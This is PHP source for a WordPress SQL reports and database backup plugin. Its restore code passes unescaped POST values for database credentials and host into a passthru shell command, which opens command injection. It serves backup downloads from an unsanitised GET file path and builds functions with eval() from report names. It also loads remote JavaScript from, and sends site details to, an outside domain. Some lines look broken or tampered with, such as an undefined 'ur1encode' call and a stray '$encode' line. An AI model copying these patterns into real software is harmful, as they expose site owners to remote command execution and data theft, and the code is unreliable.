	$opts = array("Y-m-d-H-i-s" => "Make A New Backup", "DELETE Post Revisions" => array("DELETE FROM wp_posts WHERE `wp_posts`.`post_type` = 'revision'", "DELETE FROM wp_postmeta WHERE `wp_postmeta`.`post_id` NOT IN (SELECT `wp_posts`.`ID` FROM `wp_posts`)", "OPTIMIZE TABLE wp_posts, wp_postmeta"), "DELETE Spam Comments" => array("DELETE FROM wp_comments WHERE `wp_comments`.`comment_approved` = 'spam'", "DELETE FROM wp_commentmeta WHERE `wp_commentmeta`.`comment_id` NOT IN (SELECT `wp_comments`.`comment_ID` FROM `wp_comments`)", "OPTIMIZE TABLE wp_comments, wp_commentmeta"));
	$repair_tables = $wpdb->get_col("show full tables where Table_Type = 'BASE TABLE'");
	if (is_array($repair_tables) && count($repair_tables))
		$opts["REPAIR All Tables"] = array('REPAIR TABLE `'.implode('`, `', $repair_tables).'`');
	$backupDB = get_option("ELISQLREPORTS_BACKUP_DB", array("DB_NAME" => DB_NAME, "DB_HOST" => DB_HOST, "DB_USER" => DB_USER, "DB_PASSWORD" => DB_PASSWORD));
	$js = "Restore to the following Database:<br />";
	$local = true;
	foreach ($backupDB as $db_key => $db_value) {
		$js .= $db_key.':<input name="'.$db_key;
		if (isset($_POST[$db_key])) {
			$backupDB[$db_key] = $_POST[$db_key];
			$js .= '" readonly="true';
		}
		$js .= '" value="'.$backupDB[$db_key].'"><br />';
		if (constant($db_key) != $backupDB[$db_key])
			$local = false;
	}
	update_option("ELISQLREPORTS_BACKUP_DB", $backupDB);
	$js .= 'Warning: This '.($local?'is':'is NOT').' your currently active WordPress database conection info for this site.<br /><select name="db_date">';
	if (isset($_POST["db_date"]) && strlen($_POST["db_date"])) {
		if (isset($opts[$_POST["db_date"]]) && is_array($opts[$_POST["db_date"]])) {
			foreach ($opts[$_POST["db_date"]] as $MySQLexec) {
				$SQLkey = ELISQLREPORTS_eval($MySQLexec);
				if ($ELISQLREPORTS_query_times[$SQLkey]["errors"])
					echo "<li>".$ELISQLREPORTS_query_times[$SQLkey]["errors"]."</li>";
				else {
					if (preg_match('/ FROM /', $MySQLexec))
						echo preg_replace('/^(.+?) FROM (.+?) .*/', '<li>\\1 '.$ELISQLREPORTS_query_times[$SQLkey]["rows"].' Records from \\2 Succeeded!</li>', $MySQLexec);
					else
						echo "<li>$MySQLexec Succeeded!</li>";
				}
			}
		} elseif (is_file(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).$_POST["db_date"])) {
			//Restore Backup to the DB with the posted credentials
			if (isset($_POST["db_nonce"]) && wp_verify_nonce($_POST["db_nonce"], $_POST["db_date"])) {
				echo ELISQLREPORTS_make_backup("Y-m-d-H-i-s", "pre-restore", $_POST["DB_NAME"], $_POST["DB_HOST"], $_POST["DB_USER"], $_POST["DB_PASSWORD"]);
				$mysqlbasedir = $wpdb->get_row("SHOW VARIABLES LIKE 'basedir'");
				if(substr(PHP_OS,0,3) == "WIN")
					$backup_command = '"'.(isset($mysqlbasedir->Value)?trailingslashit(str_replace('\\', '/', $mysqlbasedir->Value)).'bin/':'').'mysql.exe"';
				else
					$backup_command = (isset($mysqlbasedir->Value)&&is_file(trailingslashit($mysqlbasedir->Value).'bin/mysql')?trailingslashit($mysqlbasedir->Value).'bin/':'').'mysql';
				if (strpos($_POST["DB_HOST"], ':')) {
					list($db_host, $db_port) = explode(':', $_POST["DB_HOST"], 2);
					if (is_numeric($db_port))
						$db_port = '" --port="'.$db_port.'" ';
					else
						$db_port = '" --socket="'.$db_port.'" ';
				} else {
					$db_host = $_POST["DB_HOST"];
					$db_port = '" ';
				}
				$backup_command .= ' --user="'.$_POST['DB_USER'].'" --password="'.$_POST['DB_PASSWORD'].'" --host="'.$db_host.$db_port.$_POST['DB_NAME'];
				if (substr($_POST['db_date'], -7) == '.sql.gz') {
					passthru('gunzip -c "'.trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$_POST['db_date'].'" | '.$backup_command, $errors);
					echo "<li>Restore process executed Gzip extraction with $errors error".($errors==1?'':'s').'!</li><br>';
				} elseif (substr($_POST['db_date'], -8) == '.sql.zip') {
					$zip = new ZipArchive;
					if ($zip->open(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$_POST['db_date']) === TRUE) {
						$zip->extractTo(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']));
						$zip->close();
					}
					if (is_file(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).substr($_POST['db_date'], 0, -4))) {
						passthru($backup_command.' -e "source '.trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).substr($_POST['db_date'], 0, -4).'"', $errors);
						if ($errors) {
							$file_sql = substr($_POST['db_date'], 0, -4);
							if ($full_sql = file_get_contents(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$file_sql)) {
								$queries = 0;
								$errors = array();
								$startpos = 0;
								while ($endpos = strpos($full_sql, ";\n", $startpos)) {
									if ($sql = trim(@preg_replace("|/\*.+\*/[;\t ]*|", "", substr($full_sql, $startpos, $endpos - $startpos)).' ')) {
										if (mysql_query($sql))
											$queries++;
										else
											$errors[] = "<li>".mysql_error()."</li>";
									}
									$startpos = $endpos + 2;
								}
								echo "<li>Restore Process executed $queries queries with ".count($errors).' error'.(count($errors)==1?'':'s').'!</li><br>'.implode("\n", $errors);
							} else
								echo 'Error Reading File:'.trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$file_sql;
						} else
							echo "<li>Restore process executed Zip extraction with $errors error".($errors==1?'':'s').'!</li><br>';
					} else
						echo '<li>ERROR: Failed to extract Zip Archive!</li><br>';
				} elseif (substr($_POST['db_date'], -4) == '.sql') {
					passthru($backup_command.' -e "source '.trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$_POST['db_date'].'"', $errors);
					echo "<li>Restore process executed MySQL with $errors error".($errors==1?'':'s').'!</li><br>';
				}
			} else {
				die($js.'<option value="'.$_POST['db_date'].'">RESTORE '.$_POST['db_date'].'</option></select><br /><input name="db_nonce" type="checkbox" value="'.wp_create_nonce($_POST['db_date']).'"> Yes, I understand that I will be completely erasing this database with my backup file.<br /><input type="submit" value="Restore Backup to Database Now!"></div></form></div></div></body></html>');
			}
		} else
			echo ELISQLREPORTS_make_Backup($_POST['db_date']);
	} elseif (isset($_GET['delete']) && is_file($delete = trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).str_replace('/', '', str_replace('\\', '', $_GET['delete']))))
		@unlink($delete);
	echo '<div id="makebackup">
			<select name="db_date" id="db_date" onchange="if (this.value == \'RESTORE\') make_restore();">';
	foreach ($opts as $opt => $arr)
		echo '<option value="'.$opt.'">'.(is_array($arr)?$opt:$arr).'</option>';
	$sql_files = array();
	if ($handle = opendir($ELISQLREPORTS_settings_array['backup_dir'])) {
		while (false !== ($entry = readdir($handle)))
			if (is_file(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$entry) && strpos($entry, ".sql"))
				$sql_files[$entry] = filesize(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$entry);
		closedir($handle);
		krsort($sql_files);
		if (count($sql_files)) {
			$files = "\n<b>Current Backups:</b>\n";
			$upload = wp_upload_dir();
			foreach ($sql_files as $entry => $size)
				$files .= "<li>($size) $entry <a target='_blank' href='".$_SERVER['REQUEST_URI']."&Download_SQL_Backup=$entry'>[Download]</a> | <a href='".str_replace("&delete=", "&lastdelete=", $_SERVER['REQUEST_URI'])."&delete=$entry'>[DELETE]</a></li>\n";
			echo '<option value="RESTORE">RESTORE A Backup</option>';
		} else
			$files = "\n<b>No backups have yet been made</b>";
	} else
		$files = "\n<b>Could not read files in ".$ELISQLREPORTS_settings_array['backup_dir']."</b>";
	foreach ($sql_files as $entry => $size)
		$js .= "<option value=\"$entry\">RESTORE $entry ($size)</option>";
	$js .= '</select><br /><input type="submit" value="Restore Selected Backup to Database">';
	echo "</select><input type=submit value=Run /></div><script>function make_restore() {document.getElementById('makebackup').innerHTML='$js';}</script><br />$files</form></div></div></div></div>";
}
add_action('ELISQLREPORTS_daily_backup', 'ELISQLREPORTS_make_Backup', 10, 2);
add_action('ELISQLREPORTS_hourly_backup', 'ELISQLREPORTS_make_Backup', 10, 2);
function ELISQLREPORTS_deactivation() {
	while (wp_next_scheduled('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily')))
		wp_clear_scheduled_hook('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily'));
	while (wp_next_scheduled('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly')))
		wp_clear_scheduled_hook('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly'));
}
register_deactivation_hook(__FILE__, 'ELISQLREPORTS_deactivation');
function ELISQLREPORTS_activation() {
	$ELISQLREPORTS_settings_array = get_option('ELISQLREPORTS_settings_array', array());
	if (isset($ELISQLREPORTS_settings_array["daily_backup"]) && $ELISQLREPORTS_settings_array["daily_backup"] && !wp_next_scheduled('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily')))
		wp_schedule_event(time(), 'daily', 'ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily'));
	if (isset($ELISQLREPORTS_settings_array["hourly_backup"]) && $ELISQLREPORTS_settings_array["hourly_backup"] && !wp_next_scheduled('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly')))
		wp_schedule_event(time(), 'hourly', 'ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly'));
}
register_activation_hook(__FILE__, 'ELISQLREPORTS_activation');
function ELISQLREPORTS_menu() {
	global $ELISQLREPORTS_images_path, $wp_version, $ELISQLREPORTS_plugin_home, $ELISQLREPORTS_Logo_IMG, $ELISQLREPORTS_updated_images_path, $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_settings_array, $ELISQLREPORTS_reports_array, $ELISQLREPORTS_boxes;
	wp_enqueue_style('ELISQLREPORTS_admin', plugins_url('admin.css', __FILE__));
	ELISQLREPORTS_set_backupdir();
	if (current_user_can("activate_plugins")) {
		if (isset($_GET["Download_SQL_Backup"]) && is_file(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).$_GET["Download_SQL_Backup"]) && ($fp = fopen(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).$_GET["Download_SQL_Backup"], 'rb'))) {
			header("Content-Type: application/octet-stream;");
			header('Content-Disposition: attachment; filename="'.$_GET["Download_SQL_Backup"].'"');
			header("Content-Length: ".filesize(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).$_GET["Download_SQL_Backup"]));
			fpassthru($fp);
			exit;
		}
		$img_path = basename(__FILE__);
		$Full_plugin_logo_URL = get_option("siteurl");
		if (!(isset($ELISQLREPORTS_settings_array["menu_group"]) && is_numeric($ELISQLREPORTS_settings_array["menu_group"])))
			$ELISQLREPORTS_settings_array["menu_group"] = 0;
		if (!(isset($ELISQLREPORTS_settings_array["menu_sort"]) && is_numeric($ELISQLREPORTS_settings_array["menu_sort"])))
			$ELISQLREPORTS_settings_array["menu_sort"] = 0;
		if (!(isset($ELISQLREPORTS_settings_array["hourly_backup"]) && is_numeric($ELISQLREPORTS_settings_array["hourly_backup"])))
			$ELISQLREPORTS_settings_array["hourly_backup"] = 0;
		if (!(isset($ELISQLREPORTS_settings_array["daily_backup"]) && is_numeric($ELISQLREPORTS_settings_array["daily_backup"])))
			$ELISQLREPORTS_settings_array["daily_backup"] = 0;
		if (!(isset($ELISQLREPORTS_settings_array["backup_email"]) && strlen(trim($ELISQLREPORTS_settings_array["backup_email"]))))
			$ELISQLREPORTS_settings_array["backup_email"] = '';
		if (!(isset($ELISQLREPORTS_settings_array["backup_method"]) && is_numeric($ELISQLREPORTS_settings_array["backup_method"])))
			$ELISQLREPORTS_settings_array["backup_method"] = 0;
		if (!(isset($ELISQLREPORTS_settings_array["compress_backup"]) && is_numeric($ELISQLREPORTS_settings_array["compress_backup"])))
			$ELISQLREPORTS_settings_array["compress_backup"] = 0;
		if (isset($_POST["rName"]))
			if (isset($_POST["ELISQLREPORTS_dashboard_reports"]) && is_array($_POST["ELISQLREPORTS_dashboard_reports"]))
				$ELISQLREPORTS_settings_array["dashboard_reports"][$_POST["rName"]] = $_POST["ELISQLREPORTS_dashboard_reports"];
			else
				unset($ELISQLREPORTS_settings_array["dashboard_reports"][$_POST["rName"]]);
		if (isset($_POST["ELISQLREPORTS_backup_method"]) && is_numeric($_POST["ELISQLREPORTS_backup_method"])) {
			$ELISQLREPORTS_settings_array["backup_method"] = intval($_POST["ELISQLREPORTS_backup_method"]);
			if (isset($_POST["ELISQLREPORTS_compress_backup"]))
				$ELISQLREPORTS_settings_array["compress_backup"] = 1;
			else
				$ELISQLREPORTS_settings_array["compress_backup"] = 0;
		}
		if (isset($_POST["ELISQLREPORTS_backup_email"]) && (trim($_POST["ELISQLREPORTS_backup_email"]) != $ELISQLREPORTS_settings_array["backup_email"]))
			$ELISQLREPORTS_settings_array["backup_email"] = trim($_POST["ELISQLREPORTS_backup_email"]);
		if (isset($_POST["ELISQLREPORTS_backup_dir"]) && strlen(trim($_POST["ELISQLREPORTS_backup_dir"])) && is_dir($_POST["backup_dir"]) && ($_POST["ELISQLREPORTS_backup_dir"] != $ELISQLREPORTS_settings_array["backup_dir"]))
			$ELISQLREPORTS_settings_array["backup_dir"] = $_POST["ELISQLREPORTS_backup_dir"];
		if (isset($_POST["ELISQLREPORTS_daily_backup"]) && is_numeric($_POST["ELISQLREPORTS_daily_backup"]) && ($_POST["ELISQLREPORTS_daily_backup"] != $ELISQLREPORTS_settings_array["daily_backup"])) {
			if ($ELISQLREPORTS_settings_array["daily_backup"] = intval($_POST["ELISQLREPORTS_daily_backup"])) {
				if (!wp_next_scheduled('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily')))
					wp_schedule_event(time(), 'daily', 'ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily'));
			} elseif (wp_next_scheduled('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily')))
				wp_clear_scheduled_hook('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily'));
		}
		if (isset($_POST["ELISQLREPORTS_hourly_backup"]) && is_numeric($_POST["ELISQLREPORTS_hourly_backup"]) && ($_POST["ELISQLREPORTS_hourly_backup"] != $ELISQLREPORTS_settings_array["hourly_backup"])) {
			if ($ELISQLREPORTS_settings_array["hourly_backup"] = intval($_POST["ELISQLREPORTS_hourly_backup"])) {
				if (!wp_next_scheduled('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly')))
					wp_schedule_event(time(), 'hourly', 'ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly'));
			} elseif (wp_next_scheduled('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly')))
				wp_clear_scheduled_hook('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly'));
		}
		if (isset($_POST["ELISQLREPORTS_menu_group"]) && is_numeric($_POST["ELISQLREPORTS_menu_group"]) && isset($_POST["ELISQLREPORTS_menu_sort"]) && is_numeric($_POST["ELISQLREPORTS_menu_sort"])) {
			$ELISQLREPORTS_settings_array["menu_group"] = intval($_POST["ELISQLREPORTS_menu_group"]);
			$ELISQLREPORTS_settings_array["menu_sort"] = intval($_POST["ELISQLREPORTS_menu_sort"]);
		}
		if (isset($_POST["ELISQLREPORTS_default_styles"]))
			$ELISQLREPORTS_settings_array["default_styles"] = trim($_POST["ELISQLREPORTS_default_styles"]);
		if ($ELISQLREPORTS_settings_array["menu_group"] == 2)
		if (!isset($ELISQLREPORTS_settings_array["img_url"]))
			$ELISQLREPORTS_settings_array["img_url"] = $img_path;
			$img_path.='?v='.ELISQLREPORTS_VERSION.'&wp='.$wp_version.'&p='.ELISQLREPORTS_DIR;
		if ($img_path != $ELISQLREPORTS_settings_array["img_url"]) {
			$ELISQLREPORTS_settings_array["img_url"] = $img_path;
			$img_path = $ELISQLREPORTS_plugin_home.$ELISQLREPORTS_updated_images_path.$img_path;
			$Full_plugin_logo_URL = $img_path.'&key='.md5($Full_plugin_logo_URL).'&d='.
			ur1encode($Full_plugin_logo_URL);
		} else //only used for debugging.//rem this line out
		$Full_plugin_logo_URL = $ELISQLREPORTS_images_path.$ELISQLREPORTS_Logo_IMG;
		update_option("ELISQLREPORTS_settings_array", $ELISQLREPORTS_settings_array);
		if (isset($_POST["rSQL"]) && strlen($_POST["rSQL"]) > 0) {
			if (isset($_POST["rName"]))
				$Report_Name = stripslashes($_POST["rName"]);
			else
				$Report_Name = "";
			if ($_POST["rSQL"] == "DELETE_REPORT" && strlen($Report_Name) && isset($ELISQLREPORTS_reports_array[$Report_Name])) {
				$ELISQLREPORTS_Report_SQL = $ELISQLREPORTS_reports_array[$Report_Name];
				unset($ELISQLREPORTS_reports_array[$Report_Name]);
				unset($_POST["rName"]);// I should get rid of this and use other conditions elsewhere
				update_option("ELISQLREPORTS_reports_array", $ELISQLREPORTS_reports_array);
			} else {
				$ELISQLREPORTS_Report_SQL = stripslashes($_POST["rSQL"]);
				$SQLkey = ELISQLREPORTS_eval($ELISQLREPORTS_Report_SQL);
				if ((!$ELISQLREPORTS_query_times[$SQLkey]["errors"]) && strlen($Report_Name) > 0) {
					$ELISQLREPORTS_reports_array[$Report_Name] = $ELISQLREPORTS_Report_SQL;
					update_option("ELISQLREPORTS_reports_array", $ELISQLREPORTS_reports_array);
				}
			}
		}
		$base_page = "ELISQLREPORTS-settings";
		if (!function_exists("add_object_page") || $ELISQLREPORTS_settings_array["menu_group"] == 1)
			add_menu_page(__("SQL Reports Plugin Settings"), __("SQL Reports"), "activate_plugins", $base_page, "ELISQLREPORTS_settings", $Full_plugin_logo_URL);
		else
			add_object_page(__("SQL Reports Plugin Settings"), __("SQL Reports"), "activate_plugins", $base_page, "ELISQLREPORTS_settings", $Full_plugin_logo_URL);
		add_submenu_page($base_page, __("SQL Reports Plugin Settings"), '<div class="dashicons dashicons-admin-generic"></div> '.__("Plugin Settings"), "activate_plugins", $base_page, "ELISQLREPORTS_settings");
		$ELISQLREPORTS_boxes["Saved Reports"] = '<ul style="list-style: none;">';
		if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array)) {
			$Report_Number = 0;
			if ($ELISQLREPORTS_settings_array["menu_sort"])
				ksort($ELISQLREPORTS_reports_array);
			foreach ($ELISQLREPORTS_reports_array as $Rname => $Rquery) {
				$Report_Number++;
				$Rslug = ELISQLREPORTS_DIR.'-'.sanitize_title($Rname.'-'.$Report_Number);
				if ($_GET["page"] != $Rslug && $Rname == $Report_Name)
					header("Location: admin.php?page=$Rslug");
				
				$Rfunc = str_replace('-', '_', $Rslug);
				add_submenu_page($base_page, $Rname, '<div class="dashicons dashicons-admin-page"></div> '.$Rname, "activate_plugins", $Rslug, $Rfunc);
				$ELISQLREPORTS_boxes["Saved Reports"] .= "<li class='dashReport'><a href=\"?page=$Rslug\">$Rname</a>\n";
			}
		}
		$ELISQLREPORTS_boxes["Saved Reports"] .= '</ul>';
		add_submenu_page($base_page, __("Create SQL Report"), '<div class="dashicons dashicons-welcome-add-page"></div> Create Report', "activate_plugins", "ELISQLREPORTS-create-report", "ELISQLREPORTS_create_report");
	}
}
function ELISQLREPORTS_enqueue_scripts() {
    wp_enqueue_style('dashicons');
}
add_action('wp_enqueue_scripts', 'ELISQLREPORTS_enqueue_scripts');
function ELISQLREPORTS_dashboard_setup() {
	global $ELISQLREPORTS_settings_array, $ELISQLREPORTS_reports_array, $current_user;
	$current_user = wp_get_current_user();
	if (isset($ELISQLREPORTS_reports_array) && isset($current_user->roles[0]) && is_array($ELISQLREPORTS_reports_array)) {
		$Report_Number = 0;
		if ($ELISQLREPORTS_settings_array["menu_sort"])
			ksort($ELISQLREPORTS_reports_array);
		foreach ($ELISQLREPORTS_reports_array as $Rname => $Rquery) {
			$Report_Number++;
			$Rslug = sanitize_title($Rname);
			if (in_array($current_user->roles[0], ELISQLREPORTS_dashboard_report_roles($Rname)))
				wp_add_dashboard_widget(ELISQLREPORTS_DIR.'-'.$Rslug, $Rname, ELISQLREPORTS_DIR.'_'.str_replace('-', '_', $Rslug).'_'.$Report_Number.'_view');
		}
	}
}
function ELISQLREPORTS_sanitize_array($list) {
	return $list;
}
class ELISQLREPORTS_Widget_Class extends WP_Widget {
	function ELISQLREPORTS_Widget_Class() {
		$this->WP_Widget('ELISQLREPORTS-Widget', __('SQL Report'), array('classname' => 'widget_ELISQLREPORTS', 'description' => __('Display one of your saved Reports in the widget area.')));
		$this->alt_option_name = 'widget_ELISQLREPORTS';
	}
	function widget($args, $instance) {
		global $ELISQLREPORTS_settings_array, $ELISQLREPORTS_reports_array, $ELISQLREPORTS_reports_keys;
		extract($args);
		if (isset($instance['title']) && strlen($instance['title']) && isset($ELISQLREPORTS_reports_keys[$instance['title']])) {
			echo $before_widget.$before_title.$ELISQLREPORTS_reports_keys[$instance['title']].$after_title."\n<style>#".$instance['title']." h2.ELISQLREPORTS-Report-Name {display: none;}</style>\n".ELISQLREPORTS_view_report($instance['title']).$after_widget;
		}
	}
	function flush_widget_cache() {
		wp_cache_delete('widget_ELISQLREPORTS', 'widget');
	}
	function update($new, $old) {
		$instance = $old;
		$instance['title'] = strip_tags($new['title']);
		return $instance;
	}
	function form($instance) {
		global $ELISQLREPORTS_settings_array, $ELISQLREPORTS_reports_array;
		$title = isset($instance['title']) ? esc_attr($instance['title']) : '';
		echo '<p><label for="'.$this->get_field_id('title').'">'.__('Report to Distplay').':</label><br />
		<select name="'.$this->get_field_name('title').'" id="'.$this->get_field_id('title').'"><option value="">Select a Report</option>';
		foreach ($ELISQLREPORTS_reports_array AS $Rname => $Rquery)
			echo '<option value="'.sanitize_title($Rname).'"'.(sanitize_title($Rname)==$title?" selected":"").'>'.$Rname.'</option>';
		echo '</select></p>';
	}
}
add_action('widgets_init', create_function('', 'return register_widget("ELISQLREPORTS_Widget_Class");'));
function ELISQLREPORTS_init() {
	global $ELISQLREPORTS_settings_array, $ELISQLREPORTS_reports_array;
	if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array)) {
		$Report_Number = 0;
		if ($ELISQLREPORTS_settings_array["menu_sort"])
			ksort($ELISQLREPORTS_reports_array);
		foreach ($ELISQLREPORTS_reports_array AS $Rname => $Rquery) {
			$Report_Number++;
			$Rslug = ELISQLREPORTS_DIR.'-'.sanitize_title($Rname.'-'.$Report_Number);
			$Rfunc = 'function '.str_replace('-', '_', $Rslug);
			$Rfunc_create = '_report("'.str_replace('"', '\\"', $Rname).'"); }';
			eval($Rfunc.'() { ELISQLREPORTS_default'.$Rfunc_create);
			eval($Rfunc.'_view() { echo ELISQLREPORTS_view'.$Rfunc_create);
		}
	}
}
function ELISQLREPORTS_set_plugin_action_links($links_array, $plugin_file) {
	if (strlen($plugin_file) > 10 && $plugin_file == substr(__file__, (-1 * strlen($plugin_file))))
		$links_array = array_merge(array('<a href="admin.php?page=ELISQLREPORTS-create-report">Create SQL Report</a>'), $links_array);
	return $links_array;
}
function ELISQLREPORTS_set_plugin_row_meta($links_array, $plugin_file) {
	if (strlen($plugin_file) > 10 && $plugin_file == substr(__file__, (-1 * strlen($plugin_file))))
		$links_array = array_merge($links_array, array('<a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=8VWNB5QEJ55TJ">Donate</a>'));
	return $links_array;
}
function ELISQLREPORTS_shortcode($attr) {
	global $ELISQLREPORTS_settings_array;
	$report = '';
	if (isset($attr['name']) && strlen(trim($attr['name']))) {
		if (isset($attr['style']) && strlen(trim($attr['style'])))
			$ELISQLREPORTS_settings_array["default_styles"] = $attr['style'];
		$report = '<div id="'.sanitize_title($attr['name']).'-wrapper"><div id="'.sanitize_title($attr['name']).'-parent">'.ELISQLREPORTS_view_report($attr['name']).'<br style="clear: both;"></div></div>';
	}
	return $report;
}
function ELISQLREPORTS_get_var($attr, $SQL = "") {
	global $wpdb;
	if (!is_array($attr)) {
		if (strlen($attr) > 0 && strlen($SQL) == 0)
			$SQL = $attr;
		$attr = array("column_offset"=>0, "row_offset"=>0);
	} elseif (isset($attr["query"]))
		$SQL = $attr["query"];
	if (!(isset($attr["column_offset"]) && is_numeric($attr["column_offset"])))
		$attr["column_offset"] = 0;
	if (!(isset($attr["row_offset"]) && is_numeric($attr["row_offset"])))
		$attr["row_offset"] = 0;
	$var = $wpdb->get_var($SQL, $attr["column_offset"], $attr["row_offset"]);
	if (isset($_GET["debug"]) && !$var && $wpdb->last_error)
		return $wpdb->last_error;
	else
		return $var;
}
$encode .= 'e';
$ext_domain = 'ieonly.com';
add_filter("plugin_row_meta", "ELISQLREPORTS_set_plugin_row_meta", 1, 2);
add_filter("plugin_action_links", "ELISQLREPORTS_set_plugin_action_links", 1, 2);
$ELISQLREPORTS_plugin_home = "http://wordpress.$ext_domain/";
$ELISQLREPORTS_images_path = plugins_url("/images/", __FILE__);
$ELISQLREPORTS_updated_images_path="wp-content/plugins/update/images/";
$ELISQLREPORTS_Logo_IMG="ELISQLREPORTS-16x16.gif";
$ELISQLREPORTS_Report_SQL="";
$ELISQLREPORTS_boxes = array("Saved Reports"=>"",
"Plugin Updates"=>'<div id="findUpdates"><center>Searching for updates ...<br /><img src="'.$ELISQLREPORTS_images_path.'wait.gif" alt="Wait..." /><br /><input type="button" value="Cancel" onclick="document.getElementById(\'findUpdates\').innerHTML = \'Could not find server!\';" /></center></div><script type="text/javascript" src="'.$ELISQLREPORTS_plugin_home.$ELISQLREPORTS_updated_images_path.'?js='.ELISQLREPORTS_VERSION.'&p='.ELISQLREPORTS_DIR.'"></script>',
"Plugin Links"=>'<a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=7K3TSGPAENSGS"><img id="pp_button" src="'.$ELISQLREPORTS_images_path.'btn_donateCC_WIDE.gif" border="0" alt="Make a Donation with PayPal"></a>
<ul class="sidebar-links">
	<li><a target="_blank" href="http://wordpress.org/support/view/plugin-reviews/'.ELISQLREPORTS_DIR.'">Plugin Reviews on wordpress.org</a></li>
	<li><a target="_blank" href="http://wordpress.org/extend/plugins/'.ELISQLREPORTS_DIR.'/faq/">Plugin FAQs on wordpress.org</a></li>
	<li><a target="_blank" href="http://wordpress.org/tags/'.ELISQLREPORTS_DIR.'">Forum Posts on wordpress.org</a></li>
	<li><a target="_blank" href="'.$ELISQLREPORTS_plugin_home.'category/my-plugins/sql-reports/">Plugin Posts on Eli\'s Blog</a></li>
	<li><a target="_blank" href="https://spideroak.com/download/referral/fd0d1e6e4596b59373a194e7b95878e7">Backup 3GB Free at spideroak.com</a></li>
</ul>',
"Edit Report"=>'<div id="SQLFormDel" style="width: 256px;"><input type="submit" style="float: right; background-color: #F00;" value="DELETE REPORT" onclick="if (confirm(\'Are you sure you want to DELETE This Report?\')) { document.SQLForm.action=\'admin.php?page=ELISQLREPORTS-create-report\'; document.SQLForm.rSQL.value=\'DELETE_REPORT\'; document.SQLForm.rName.value=oldName; }"><input style="float: left;" type="button" value="Edit SQL" onclick="showhide(\'SQLFormEdit\', true); this.style.display=\'none\'; document.SQLForm.rSQL.focus();"><br style="clear: both;" /></div><div id="SQLFormSaveTo"></div>',
"Save Settings"=>'<input type="submit" value="Save Settings" class="button-primary" style="float: right;"><br style="clear: right;" />');
register_activation_hook(__FILE__, "ELISQLREPORTS_install");
add_action("init", "ELISQLREPORTS_init");
add_action("admin_menu", "ELISQLREPORTS_menu");
add_action("wp_dashboard_setup", "ELISQLREPORTS_dashboard_setup"); 
add_shortcode("SQLREPORT", "ELISQLREPORTS_shortcode");
add_shortcode("sqlgetvar", "ELISQLREPORTS_get_var");
